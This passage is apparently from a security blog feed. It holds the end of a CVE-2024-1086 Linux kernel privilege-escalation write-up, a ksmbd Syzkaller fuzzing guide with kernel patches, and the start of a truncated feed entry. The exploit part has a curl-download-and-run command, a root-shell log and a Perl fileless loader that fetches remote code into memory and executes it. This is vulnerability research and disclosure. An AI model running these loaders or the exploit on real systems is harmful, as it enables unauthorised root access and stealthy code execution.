}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.6.1: A part of the </span><code spellcheck="false" style="white-space: pre-wrap;"><span>main()</span></code><span style="white-space: pre-wrap;"> exploit function written in C, which sets up the child processes and waits until the exploit is done.</span></p></figcaption></figure><h4 id="517-running-it">5.1.7. Running it</h4><p>For KernelCTF, I ran the exploit using <code>cd /tmp &amp;&amp; curl https://secret.pwning.tech/&lt;gid&gt; -o ./exploit &amp;&amp; chmod +x ./exploit &amp;&amp; ./exploit</code>. This takes advantage of the writable <code>/tmp</code> directory on the target machine. This was before I realized I could presumably execute the exploit filelessly with Perl. Finally, after months of work, we are rewarded with:</p><figure class="kg-card kg-code-card"><pre><code>user@lts-6:/$ id
uid=1000(user) gid=1000(user) groups=1000(user)

user@lts-6:/$ curl https://cno.pwning.tech/aaaabbbb-cccc-dddd-eeee-ffffgggghhhh -o /tmp/exploit &amp;&amp; cd /tmp &amp;&amp; chmod +x exploit &amp;&amp; ./exploit
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  161k  100  161k    0     0   823k      0 --:--:-- --:--:-- --:--:--  823k

[*] creating user namespace (CLONE_NEWUSER)...
[*] creating network namespace (CLONE_NEWNET)...
[*] setting up UID namespace...
[*] configuring localhost in namespace...
[*] setting up nftables...
[+] running normal privesc
[*] waiting for the calm before the storm...
[*] sending double free buffer packet...
[*] spraying 16000 pte&apos;s...
[   13.592791] ------------[ cut here ]------------
[   13.594923] WARNING: CPU: 0 PID: 229 at mm/slab_common.c:985 free_large_kmalloc+0x3c/0x60
...
[   13.746361] ---[ end trace 0000000000000000 ]---
[   13.748375] object pointer: 0x000000003d8afe8c
[*] checking 16000 sprayed pte&apos;s for overlap...
[+] confirmed double alloc PMD/PTE
[+] found possible physical kernel base: 0000000014000000
[+] verified modprobe_path/usermodehelper_path: 0000000016877600 (&apos;/sanitycheck&apos;)...
[*] overwriting path with PIDs in range 0-&gt;4194304...
[   14.409252] process &apos;exploit&apos; launched &apos;/dev/fd/13&apos; with NULL argv: empty string added
/bin/sh: 0: can&apos;t access tty; job control turned off
root@lts-6:/# id
uid=0(root) gid=0(root) groups=0(root)

root@lts-6:/# cat /flag
kernelCTF{v1:mitigation-v3-6.1.55:1705665799:...}

root@lts-6:/# </code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.7.1: An exploit log for an exploitation attempt on the KernelCTF, leading to a root shell.</span></p></figcaption></figure><p>Practically speaking, the user could copy/paste the PID from the kernel warning into the exploit stdin when working with KernelCTF remote instances, but I wanted to bruteforce PIDs so my exploit works on other infrastructure as well.</p><p>The exploit supports fileless execution when the target has perl installed. This is nice when the target filesystem is read-only. It works by setting modprobe_path to <code>/proc/&lt;exploit_pid&gt;/fd/&lt;target_script&gt;</code> among other things.</p><figure class="kg-card kg-code-card"><pre><code class="language-perl">perl -e &apos;
  require qw/syscall.ph/;

  my $fd = syscall(SYS_memfd_create(), $fn, 0);
  open(my $fh, &quot;&gt;&amp;=&quot;.$fd);
  print $fh `curl https://example.com/exploit -s`;
  exec {&quot;/proc/$$/fd/$fd&quot;} &quot;memfd&quot;;
&apos;</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.7.2: An exploit bootstrap script in Perl, which executes the exploit without writing to disk (fileless-execution).</span></p></figcaption></figure><h3 id="52-source-code">5.2. Source code</h3><p>The exploit source code can be found in my&#xA0;<a href="https://github.com/Notselwyn/CVE-2024-1086" rel="noreferrer">CVE-2024-1086 PoC repository</a>. As with all of my software projects, I tried to focus on developer experience as well. Hence, the exploit source code has been split across several files for the separation of concerns, and only the functions which should be called in other files are exported (put inside of the .h file) whilst all other functions are marked static. This is much like the public/private attributes of OOP languages.&#xA0;</p><p>Additionally, I decided to make the exploit crash/exit instead of properly returning errors when an error occurs. I do this since there is no added value in returning error codes, as its purpose is being a stand-alone binary and not a library. Hence, if one decides for whatever reason to embed these functions into a library, they should semantically speaking make the functions return error codes instead.</p><p>If I&apos;m missing any important semantics, feel free to send me a DM (using contact details at the bottom of this blogpost).</p><h3 id="53-compiling-the-exploit">5.3 Compiling the exploit</h3><h4 id="531-dependencies">5.3.1. Dependencies</h4><p>The exploit has 2 dependencies: <code>libnftnl-dev</code> and <code>libmnl-dev</code>. Libmnl parses and constructs netlink headers, whilst libnftnl presumably constructs netfilter-like objects for the user such as chains and tables, and serializes them to netlink messages for libmnl. This is a powerful combination which allows the user to do pretty much anything required for the exploit. </p><p>Regretfully, I had to do a bit of tweaking for the exploit. In the exploit repository,  have added an .a (ar archive) file for the libraries compiled with musl-gcc, which is essentially an .zip for object files which the compilers understand. This allows for statically linking the libraries with musl-gcc. I had to download a seperate <code>libmnl-dev</code> version, but this is listed in a section below. Fortunately enough for the end-user, this means they do not have to install the libraries seperately. </p><h4 id="532-makefile">5.3.2. Makefile</h4><p>To statically compile the exploit for KernelCTF, I used the following makefile:</p><figure class="kg-card kg-code-card"><pre><code class="language-makefile">SRC_FILES := src/main.c src/env.c src/net.c src/nftnl.c src/file.c
OUT_NAME = ./exploit

# use musl-gcc since statically linking glibc with gcc generated invalid opcodes for qemu
#   and dynamically linking raised glibc ABI versioning errors
CC = musl-gcc

# use custom headers with fixed versions in a musl-gcc compatible manner
# - ./include/libmnl: libmnl v1.0.5
# - ./include/libnftnl: libnftnl v1.2.6
# - ./include/linux-lts-6.1.72: linux v6.1.72
CFLAGS = -I./include -I./include/linux-lts-6.1.72 -Wall -Wno-deprecated-declarations

# use custom object archives compiled with musl-gcc for compatibility. normal ones 
#   are used with gcc and have _chk funcs which musl doesn&apos;t support
# the versions are the same as the headers above
LIBMNL_PATH = ./lib/libmnl.a
LIBNFTNL_PATH = ./lib/libnftnl.a

exploit: _compile_static _strip_bin
clean:
	rm $(OUT_NAME)


_compile_static:
	$(CC) $(CFLAGS) $(SRC_FILES) -o $(OUT_NAME) -static $(LIBNFTNL_PATH) $(LIBMNL_PATH)
_strip_bin:
	strip $(OUT_NAME)</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.3.2.1: The Makefile used to statically compile the exploit.</span></p></figcaption></figure><h4 id="533-static-compilation-remarks-errors">5.3.3. Static compilation remarks &amp; errors</h4><blockquote>This section is just for troubleshooting people who try to static-compile their own exploits.</blockquote><h5 id="5331-libmnl-not-found">5.3.3.1. Libmnl not found</h5><p>One of the issues when living the easy life with apt and compiling with gcc, was that <code>libmnl-dev</code> - one of the libraries containing the netlink functions - in the Debian stable repository has an invalid .a file at the time of writing this. When trying to compile statically, this will look like:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">/usr/bin/ld: cannot find -lmnl: No such file or directory 
collect2: error: ld returned 1 exit status 
make: *** [Makefile:17: _compile_static] Error 1</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.3.3.1.1: Shell stderr output containing an linking error about being unable to resolve libmnl.</span></p></figcaption></figure><p>To fix this, please install the libmnl package which is currently in the unstable repository: <code>sudo apt install libmnl-dev/sid</code> (<code>*/sid</code> installs the package from the Debian unstable repo).</p><p>Otherwise, just clone the libmnl repository and compile the library yourself with gcc, and create the .a file yourself.</p><h5 id="5332-invalid-opcodesavx-fun">5.3.3.2. Invalid opcodes - AVX fun</h5><p>The last issue I experienced when compiling the exploit statically using gcc with glibc, was the use of unsupported instructions - specifically unsupported AVX(512) instructions, observed by opening the binary in Ghidra and looking at the RIP address. The x86 extension AVX512 includes instructions for usage of bigger registers supported by server CPUs. Usually gcc uses the architecture and supported instructions of the CPU it is running on to poll its support for instructions, i.e. using CPUID. However, I was compiling the exploit in a QEMU VM with the <code>-cpu host</code> argument set, on my Intel Xeon CPU which has support for AVX512.</p><p>The issue is that QEMU - at least in that version - does not support AVX512 extensions. So 50% of the time the exploit would raise a CPU trap in QEMU due to unsupported opcodes (instructions). The reason these instructions were executed is yet another rabbit hole.</p><figure class="kg-card kg-code-card"><pre><code>[   15.211423] traps: exploit[167] trap invalid opcode ip:433db9 sp:7ffcb0682ee8 error:0 in exploit[401000+92000]</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.3.3.2.1: Dmesg output containing an invalid opcode error (CPU trap).</span></p></figcaption></figure><p>I solved this by simply removing the <code>-cpu host</code> argument of the QEMU VM and compiling the exploit in that VM as it would use the actual CPU properties that QEMU supports, and hence gcc would no longer use AVX512 considering CPUID does not spoof AVX512 support.</p><p>Sadly enough, the KernelCTF instances always have the <code>-cpu host</code> argument enabled. Fortunately, the KernelCTF community told me I needed to statically compile the exploit with musl-gcc instead, since glibc is not made for static compilation.</p><h2 id="6-discussion">6. Discussion</h2><h3 id="61-the-double-free-methods">6.1. The double-free methods</h3><p>In the blogpost, I present 2 methods to allocate an order==0 page and order==4 page to the same address: draining the PCP lists, and the race condition. The former made the latter obsolete because it is not depending on a race condition.</p><p>The race condition method only works properly for VMs with emulated serial TTYs (i.e. not virtio-serial), because the race condition window is too small on physical systems (~1ms instead of 50ms-300ms). Fortunately enough, this delay was 300ms for KernelCTF and hence allowed me to use this method.</p><p>I was not satisfied with the quality and stability of this method, so I refined the exploit for longer than a month, and (among other improvements) came up with the 2nd method: draining the PCP list to allocate pages from the buddy-allocator.</p><p>When I started writing the exploit, I was not familiar with the internals of the buddy-allocator and the PCP-allocator. Only after investigating the internals of the allocators I understand how I could properly abuse it for the exploit. Hence, one of the biggest lessons I have internalized is fully understanding something before trying to abuse it, because it will always have advantages.</p><h3 id="62-post-exploitation-stability">6.2. Post-exploitation stability</h3><p>Because the proof-of-concept exploit in this blogpost is utilizing a sk_buff double-free, and has to deal with corrupted skb&apos;s, we have to deal with noise in the freelist when network activity happens. When a packet is transmitted or received, an skb&apos;s will be allocated from and deallocated to the freelist. Currently, we try to minimize this by disabling stdout around double-free time, which helps when the exploit is running over SSH or a reverse shell.</p><p>However, on some hardware systems (like Debian in the hardware setup table), it seems the exploit still manages to crash the system after a few seconds. I have not looked into this, but I suspect this may be because the hardware-based test devices are laptops, and therefore have WiFi adapters. Because WiFi frames (which may not even be targetted to the devices) are also skb&apos;s, an WiFi connected device on a high-usage WiFi network (such as the test devices) may be unstable. When the WiFi adapter is disabled in BIOS, the exploit runs fine, which supports this theory.</p><p>If a researcher wants to increase the stability of the exploit post-exploitation, they would probably want to either manipulate the SLUB allocator to make the corrupted skb unavailable, or use Dirty Pagedirectory to fix this matter.</p><h2 id="7-mindset-signing-off">7. Mindset &amp; Signing Off</h2><h3 id="71-vr-mindset">7.1. VR mindset</h3><p>While tackling this project, I focused on three key objectives: ensuring broad compatibility, resilient stability, and covert execution. In essence, it culminated in a highly-capable kernel privilege-escalation exploit. Additionally, I tried to keep the codebase as elegant as possible, utilizing my software engineering background.</p><p>This meant that on top of the 2-month development period, there were 2 months for refining the exploit for high stability and compatibility. I decided to take this path since I wanted to demonstrate my technical capabilities in this blogpost (and to challenge myself).</p><p>This meant thinking differently: I needed to abuse intended, data-only behaviour in subsystems which would be broadly available. This is reflected in the exploit techniques, because I only make use of the IPv4 subsystem and virtual memory, which are enabled on nearly all kernel builds. In fact, most work for the exploit was put into hitting specific codepaths (e.g. the packet being sent from 1.1.1.1 to 255.255.255.255) and making it elegant. </p><p>Additionally, I&apos;m not exploiting any slab-allocator behaviour for the exploit itself: just for masking sk_buff objects, and initial kmalloc/kfree calls which are passed down to the page allocators. Because of this, the exploit is not affected by slab-allocator behaviour which tends to change across versions due to new mitigations like random kmalloc caches. Unfortunately, the initial bug requires unprivileged user namespaces and nftables. The other techniques - like Dirty Pagedirectory and PCP draining - should work regardless of this, and hence can be used for real-world exploits </p><h3 id="72-reflection">7.2. Reflection</h3><p>I had great fun researching the bug and exploitation techniques, and was really invested in making the exploit work. Never had I ever gotten so much joy developing a project, specifically when dropping the first root shell with the bug. Additionally, I have learned a great deal about the networking subsystem of the Linux kernel (from nftables to IP fragmentation to IP handling code) and the memory management subsystem (from allocators to pagetables). </p><p>Of all my experiences in the IT field - ranging from software engineering to network engineering to security engineering - this was by far the most joyful project, and it gave me one of the biggest challenges I have encountered yet.</p><p>Additionally, it gave me inspiration for other projects which I want to develop and publish to contribute to the community. But until they are ready to be revealed to the world, they shall remain in the dark. :^)</p><h3 id="73-credits">7.3. Credits</h3><p>I&apos;d like to thank the following people for contributing to the blogpost in various ways:</p><ul><li>@<a href="https://twitter.com/ky1ebot" rel="noreferrer">ky1ebot</a> (Twitter/X): extensive peer-review.</li><li>@<a href="https://github.com/daanbreur">daanbreur</a> (Github): assistance with diagram colorscheme.</li></ul><p>Additionally, I tried to link every blogpost/article/etc I utilized in the relevant sections. If you believe I reused your technique without credits, please reach out to me, and I will link your blogpost in the relevant section.</p><h3 id="74-signing-off">7.4. Signing off</h3><p>Thank you for reading, it&apos;s been an honor to present this article.</p><p>For professional inquiries, please contact <a href="mailto:notselwyn@pwning.tech" rel="noreferrer">notselwyn@pwning.tech</a> (<a href="https://pwning.tech/pgp-notselwyn-pwning-tech-DE800B06B04C6635.asc" rel="noreferrer">PGP key</a>) as I would love to discuss options and ideas. For other shenanigans, please don&apos;t be afraid to slide into my Twitter DMs over at @<a href="https://twitter.com/notselwyn">notselwyn</a>.</p><p>Notselwyn&#x200C;&#x200C;<br>March 2024</p><p></p>]]></content:encoded></item><item><title><![CDATA[Tickling ksmbd: fuzzing SMB in the Linux kernel]]></title><description><![CDATA[Following the adventure of manually discovering network-based vulnerabilities in the Linux kernel, I'm adding ksmbd-fuzzing functionality to the already extensive kernel-fuzzing tool that is Syzkaller.]]></description><link>https://pwning.tech/ksmbd-syzkaller/</link><guid isPermaLink="false">658f44f8d32e980001de21f4</guid><category><![CDATA[Fuzzing]]></category><category><![CDATA[Ksmbd]]></category><category><![CDATA[Syzkaller]]></category><category><![CDATA[Linux Kernel]]></category><category><![CDATA[KCOV]]></category><category><![CDATA[Real World]]></category><dc:creator><![CDATA[notselwyn]]></dc:creator><pubDate>Sat, 16 Sep 2023 13:48:24 GMT</pubDate><content:encoded><![CDATA[<p>This blogpost is the next installment of my series of hands-on no-boilerplate vulnerability research blogposts, intended for time-travelers in the future who want to do Linux kernel vulnerability research for bugs. In this blogpost I&apos;m discussing adding psuedo-syscalls and struct definitions for ksmbd to Syzkaller, setting up an working ksmbd instance, and patching ksmbd in order to collect KCOV. Let&apos;s dive in!</p><h2 id="1-what-are-syzkaller-and-kcov">1. What are Syzkaller and KCOV?</h2><p>Syzkaller is an unsupervised coverage-guided kernel fuzzer, or put differently: it throws generated input at a kernel (through system calls, network packets, et cetera) based on educated-guesses in order to find bugs in that kernel. Syzkaller has builtin support for several kernels, such as Windows, Linux and OpenBSD. A full list can be found in <a href="https://github.com/google/syzkaller">Syzkaller&apos;s Github repository</a>.</p><p>Syzkaller partially bases its prioritization on KCOV (kernel coverage) since it assumes that more coverage = more bugs. For a full explanation of Syzkaller and KCOV please refer to the <em>&quot;Collecting network coverage &#x2014; KCOV&quot;</em> and <em>&quot;Integrating into syzkaller&quot;</em> sections of the <a href="https://xairy.io/articles/syzkaller-external-network#-collecting-network-coverage--kcov" rel="noreferrer">&quot;Looking for Remote Code Execution bugs in the Linux kernel&quot;</a> blogpost by Xairy.io in order to deduplicate content and keep this blogpost as technical as possible.</p><h2 id="2-adding-syzkaller-definitions-for-ksmbd">2. Adding Syzkaller definitions for ksmbd</h2><p>In order to make Syzkaller generate input in an efficient matter, we need to give it the structure of the input. For ksmbd, those inputs are SMB requests and hence we need to provide Syzkaller with the structures for SMB requests. The file with my unauthenticated ksmbd definitions can be found here: <a href="https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/ksmbd-fuzzing/ksmbd.txt"><code>ksmbd.txt</code></a>.</p><p>The syntax for <em>declaring</em> Syzkaller structures and psuedo-syscalls is quite straightforward and well documented in their Github repository. For ksmbd, you can just copy <code>ksmbd.txt</code> to <code>sys/linux/ksmbd.txt</code> in the Syzkaller repository and Syzkaller will automatically index it. When defining Syzkaller structures you should be as tightly emulating the real data as possible. Hence, please note that the structures are marked as <code>[packed]</code>, which means that Syzkaller should not add <em>any</em> padding to the structure, as that will ruin the validity of the SMB request.</p><p>However, <em>defining</em> Syzkaller psuedo-syscalls is not as well documented. In order to define your own psuedo-syscalls, you need to define the functions in <code>executor/common_linux.h</code> in the Syzkaller repository. The code I added for sending the requests is (with explanation below):</p><figure class="kg-card kg-code-card"><pre><code class="language-c">#if SYZ_EXECUTOR || __NR_syz_ksmbd_send_req
#include &lt;netinet/in.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;

#define KSMBD_BUF_SIZE 16000

static long syz_ksmbd_send_req(volatile long a0, volatile long a1, volatile long a2, volatile long a3)
{
	int sockfd;
	int packet_reqlen;
	int errno;
	struct sockaddr_in serv_addr;
	char packet_req[KSMBD_BUF_SIZE]; // max frame size

	debug(&quot;[*]{syz_ksmbd_send_req} entered ksmbd send...\n&quot;);

	if (a0 == 0 || a1 == 0) {
		debug(&quot;[!]{syz_ksmbd_send_req} param empty\n&quot;);
		return -7;
	}

	sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sockfd &lt; 0) {
		debug(&quot;[!]{syz_ksmbd_send_req} failed to create socket\n&quot;);
		return -1;
	}

	memset(&amp;serv_addr, &apos;\0&apos;, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);
	serv_addr.sin_port = htons(445);

	errno = connect(sockfd, (struct sockaddr*)&amp;serv_addr, sizeof(serv_addr));
	if (errno &lt; 0) {
		debug(&quot;[!]{syz_ksmbd_send_req} failed to connect (err: %d)\n&quot;, errno);
		return errno ^ 0xff80000;
	}

	// prepend kcov handle to packet
	packet_reqlen = a1 + 8 &gt; KSMBD_BUF_SIZE ? KSMBD_BUF_SIZE - 8 : a1;
	*(unsigned long*)packet_req = procid + 1;
	memcpy(packet_req + 8, (char*)a0, packet_reqlen);

	if (write(sockfd, (char*)packet_req, packet_reqlen + 8) &lt; 0)
		return -4;

	if (read(sockfd, (char*)a2, a3) &lt; 0)
		return -5;

	if (close(sockfd) &lt; 0)
		return -6;

	debug(&quot;[+]{syz_ksmbd_send_req} successfully returned\n&quot;);

	return 0;
}
#endif
</code></pre><figcaption><p><span style="white-space: pre-wrap;">C source-code for </span><code spellcheck="false" style="white-space: pre-wrap;"><span>syz_ksmbd_send_req</span></code><span style="white-space: pre-wrap;">: a custom psuedo-syscall</span></p></figcaption></figure><p>The function prepends the process ID of the currently running syz-executor to a TCP packet, sends the TCP packet (like an SMB request) to 127.0.0.1:445 and receives a TCP packet (like an SMB response). Prepending the process ID to the packet has todo with kcov and will be explained in section 4.</p><p>The psuedo-syscall can be exclusively whitelisted using the following value in the Syzkaller config (the full config can be found in section 5):</p><figure class="kg-card kg-code-card"><pre><code class="language-json">}
	// ...
	&quot;enable_syscalls&quot;: [
		&quot;syz_ksmbd_send_req&quot;
	],
	// ...
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">A snippet of the &quot;enable_syscalls&quot; key in the Syzkaller config</span></p></figcaption></figure><h2 id="3-setting-up-ksmbd">3. Setting up ksmbd</h2><p>In order to interact with ksmbd, we need to send SMB packets to at 127.0.0.1:445. However when we the executor tries it, it will not able to reach it due to two reasons: </p><ol><li>Ksmbd needs to be started from userland</li><li>Networking namespaces prevent access</li></ol><p>In order to start the ksmbd TCP server in the kernel we need to kickstart it using the userland <a href="https://github.com/cifsd-team/ksmbd-tools">toolset</a>. Specifically, we need to setup an SMB user in order to start the SMB server and run the command to start the ksmbd server. In order to be able to interact with ksmbd in Syzkaller VMs, we need to run those commands in every VM at boot-time. I solved this by creating an systemctl service, which runs a script that kickstarts ksmbd.</p><figure class="kg-card kg-code-card"><pre><code class="language-toml">[Unit]
Description=Ksmbd
After=network.target
StartLimitIntervalSec=0
Type=simple
Restart=always
RestartSec=1

[Service]
User=root
Group=root
ExecStart=/root/start_ksmbd.sh

[Install]
WantedBy=multi-user.target</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>/etc/systemd/system/ksmbd.service</span></code><span style="white-space: pre-wrap;">: a TOML file containing a description of an systemctl service</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-bash">#!/usr/bin/env bash

ksmbd.addshare --add-share=files --options=&quot;path = /tmp 
read only = no&quot;
ksmbd.adduser -a user -p password
ksmbd.mountd -n</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>/root/start_ksmbd.sh</span></code><span style="white-space: pre-wrap;">: a simple shell script that kickstarts ksmbd by running several commands</span></p></figcaption></figure><p>After enabling the service, it should be possible to connect to ksmbd using <code>nc 127.0.0.1 445 -v</code>.</p><p>Lastly, Syzkaller enables networking namespaces by default. The ksmbd service only works on 127.0.0.1:445 in the root-namespace, so the syz-executor instances will not be able to connect to ksmbd since they run in their own namespaces. To bypass this feature, I patched the Syzkaller source-code to avoid creating a network namespace:</p><pre><code class="language-diff">static int do_sandbox_none(void)
{
    // [snip]
#if SYZ_EXECUTOR || SYZ_NET_DEVICES
    initialize_netdevices_init();
#endif
+   /*
    if (unshare(CLONE_NEWNET)) {
        debug(&quot;unshare(CLONE_NEWNET): %d\n&quot;, errno);
    }
+   */
    // Enable access to IPPROTO_ICMP sockets, must be done after CLONE_NEWNET.
    write_file(&quot;/proc/sys/net/ipv4/ping_group_range&quot;, &quot;0 65535&quot;);
+   /*
#if SYZ_EXECUTOR || SYZ_DEVLINK_PCI
    initialize_devlink_pci();
#endif
    // [snip]
#if SYZ_EXECUTOR || SYZ_NET_DEVICES
    initialize_netdevices();
#endif
+   */
#if SYZ_EXECUTOR || SYZ_WIFI
    initialize_wifi_devices();
#endif
    setup_binderfs();

+   /*
    int netns = open(&quot;/proc/1/ns/net&quot;, O_RDONLY);
    // [snip]
    close(netns);
+   */

    loop();
    doexit(1);
}
#endif</code></pre><p>Now, the syz-executor instances run in the (same) root-namespace which means that the ksmbd service is available at 127.0.0.1:445 for syz-executor instances.</p><h2 id="4-adding-kcov-support-to-ksmbd">4. Adding KCOV support to ksmbd</h2><p>When we try to fuzz ksmbd using the Syzkaller setup demonstrated above in section 2 and section 3 we will notice that the Syzkaller coverage page will not show any coverage in ksmbd, even though it gets valid SMB response. The result of that is that Syzkaller will not generate input based on the amount of ksmbd code reached and the compared request values. We do not get any KCOV because the execution flow of sending our SMB request starts at sys_send() and passes through the networking stack, where soft interrupt requests (softirq&apos;s) handles sending and receiving the packet. Because interrupt contexts do not have a process context assigned, they do not support KCOV and stop coverage tracking. Therefore, we need to <em>either</em>:</p><ol><li>Patch the networking subsystem to not use softirq&apos;s</li><li>Patch ksmbd to use remote KCOV</li></ol><p>I started out trying to patch the networking subsystem because I did not know about remote KCOV, but I ended up giving up due to the complexity of the networking subsystem. Hence, that left me exploring the web for alternatives: enter remote KCOV.</p><p>Remote KCOV allows you to (re)start KCOV using an identifier which the KCOV collector (like syz-fuzzer) uses to assign certain KCOV to a certain process (like syz-executor). Specifically, syz-fuzzer user the syz-executor instance PID as KCOV identifier, so we need to pass our process id to ksmbd per connection. Luckily, we can prepend the PID to our SMB packet in syz-executor without ugly side effects due to the way ksmbd works with sockets: we can execute an simple <code>read(sock_fd, &amp;pid, 8)</code> function call at the start of the TCP connection handler to acquire the process id in ksmbd. The codeblocks below contain patches for starting remote KCOV (explanation below):</p><figure class="kg-card kg-code-card"><pre><code class="language-diff">struct ksmbd_conn {
    // [snip]

+   unsigned long         kcov_handle;
};
</code></pre><figcaption><p><span style="white-space: pre-wrap;">C source-code containing a patch for the struct </span><code spellcheck="false" style="white-space: pre-wrap;"><span>ksmbd_conn</span></code></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-diff">int ksmbd_conn_handler_loop(void *p)
{
    struct ksmbd_conn *conn = (struct ksmbd_conn *)p;
    struct ksmbd_transport *t = conn-&gt;transport;
    unsigned int pdu_size, max_allowed_pdu_size;
    char hdr_buf[4] = {0,};
    int size;

    // [snip]

    if (t-&gt;ops-&gt;prepare &amp;&amp; t-&gt;ops-&gt;prepare(t))
        goto out;

+   size = t-&gt;ops-&gt;read(t, (char*)&amp;conn-&gt;kcov_handle, sizeof(conn-&gt;kcov_handle), -1);
+   if (size != sizeof(conn-&gt;kcov_handle))
+       goto out;
+
+   kcov_remote_start(conn-&gt;kcov_handle);

    conn-&gt;last_active = jiffies;
    while (ksmbd_conn_alive(conn)) {
        // [snip]
    }

+   kcov_remote_stop();

out:
    // [snip]
    return 0;
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">C source-code containing a patch for the function </span><code spellcheck="false" style="white-space: pre-wrap;"><span>ksmbd_conn_handler_loop()</span></code></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-diff">static void handle_ksmbd_work(struct work_struct *wk)
{
    struct ksmbd_work *work = container_of(wk, struct ksmbd_work, work);
    struct ksmbd_conn *conn = work-&gt;conn;

+   kcov_remote_start(conn-&gt;kcov_handle);
    atomic64_inc(&amp;conn-&gt;stats.request_served);
    
    __handle_ksmbd_work(work, conn);

    // [snip]

+   kcov_remote_stop();
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">C source-code containing a patch for the function </span><code spellcheck="false" style="white-space: pre-wrap;"><span>handle_ksmbd_work()</span></code></p></figcaption></figure><p>As you can see, we add the <code>kcov_handle</code> property to <code>struct ksmbd_conn</code> to keep track of the KCOV identifier throughout the process of handling an SMB request. Secondly, when an TCP connection gets accepted (and <code>ksmbd_conn_handler_loop</code> gets called) we instantly read the first 8 bytes to <code>kcov_handle</code>, after which the rest of the code will not notice anything with regards to the prepended data. However, <code>ksmbd_conn_handler_loop</code> itself will defer SMB requests within the TCP session so we lose KCOV yet again. Hence, we need to start KCOV again in <code>handle_ksmbd_work</code> which is called for each SMB-request related TCP packet. Luckily, we saved the <code>kcov_handle</code> in <code>struct ksmbd_conn</code> so we can easily access it to restart KCOV.</p><h2 id="5-testing-it">5. Testing it</h2><p>We can recompile syzkaller using:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">make generate -j`nproc`  # generate headers containing our psuedo-syscall
make -j`nproc`  # build binaries</code></pre><figcaption><p><span style="white-space: pre-wrap;">Linux shell commands</span></p></figcaption></figure><p>The config I used for fuzzing (it should be ironed out per system):</p><figure class="kg-card kg-code-card"><pre><code class="language-json">{
	&quot;target&quot;: &quot;linux/amd64&quot;,
	&quot;http&quot;: &quot;0.0.0.0:56741&quot;,
	&quot;workdir&quot;: &quot;workdir&quot;,
	&quot;kernel_obj&quot;: &quot;./linux-v6.4-patched&quot;,
	&quot;image&quot;: &quot;./image/bullseye.img&quot;,
	&quot;sshkey&quot;: &quot;./image/bullseye.id_rsa&quot;,
	&quot;syzkaller&quot;: &quot;/opt/syzkaller&quot;,
	&quot;procs&quot;: 16,
	&quot;type&quot;: &quot;qemu&quot;,
	&quot;sandbox&quot;: &quot;none&quot;,
	&quot;enable_syscalls&quot;: [
		&quot;syz_ksmbd_send_req&quot;
	],
	&quot;vm&quot;: {
		&quot;count&quot;: 24,
		&quot;kernel&quot;: &quot;./linux-v6.4-patched/arch/x86/boot/bzImage&quot;,
		&quot;cpu&quot;: 1,
		&quot;cmdline&quot;: &quot;net.ifnames=0 oops=panic panic_on_warn=1 panic_on_oops=1&quot;,
		&quot;mem&quot;: 2048
	}
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">A json datastructure containing configuration values for Syzkaller</span></p></figcaption></figure><p>When testing the Syzkaller and ksmbd setups demonstrated above, everything should run smoothly without any nasty errors or bugs. While using Syzkaller with the config above I found 4 unique bugs in an Linux 6.4 release:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://pwning.tech/content/images/2024/01/ksmbd.png" class="kg-image" alt loading="lazy" width="921" height="277" srcset="https://pwning.tech/content/images/size/w600/2024/01/ksmbd.png 600w, https://pwning.tech/content/images/2024/01/ksmbd.png 921w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">The Syzkaller dashboard containing 4 unique bugs (3 times out-of-bounds read and 1 use-after-free write)</span></figcaption></figure><h2 id="6-conclusion">6. Conclusion</h2><p>I&apos;m satisfied with how the fuzzer turned out as it allows me to fuzz unauthenticated SMB requests, but there&apos;s still a long way to go to improve the QoL of (ksmbd) fuzzing:</p><ol><li>Extending the SMB request definitions to support more commands</li><li>Implementing authentication using a psuedo-syscall that returns the session id</li></ol><p>Thank you for reading my blogpost, I hope you learned as much as I did researching and writing about these topics. For questions, job inquiries, and other things, please send an email to <a href="mailto:notselwyn@pwning.tech" rel="noreferrer">notselwyn@pwning.tech</a> (<a href="https://pwning.tech/pgp-notselwyn-pwning-tech-DE800B06B04C6635.asc" rel="noreferrer">PGP key</a>).</p>]]></content:encoded></item><item><title><![CDATA[Unleashing ksmbd: crafting remote exploits of the Linux kernel]]></title><description><![CDATA[<p>December 22nd 2022: it&apos;s Christmas Thursday, one of the last workdays before the Christmas vacation starts. Whilst everyone was looking forward to opening presents from friends and family, the Zero Day Initiative decided to give the IT community a present as well: immense stress in the form of</p>]]></description><link>https://pwning.tech/ksmbd/</link><guid isPermaLink="false">658f44f8d32e980001de21f3</guid><category><![CDATA[Linux Kernel]]></category><category><![CDATA[Real World]]></category><category><![CDATA[Heap Memory]]></category><category><![CDATA[Binary Exploitation]]></category><category><![CDATA[Ksmbd]]></category><category><![CDATA[Exploit]]></category><category><![CDATA[Zeroday]]></category><category><![CDATA[ZDI-23-979]]></category><category><![CDATA[ZDI-23-980]]></category><dc:creator><![CDATA[notselwyn]]></dc:creator><pubDate>Fri, 04 Aug 2023 18:57:34 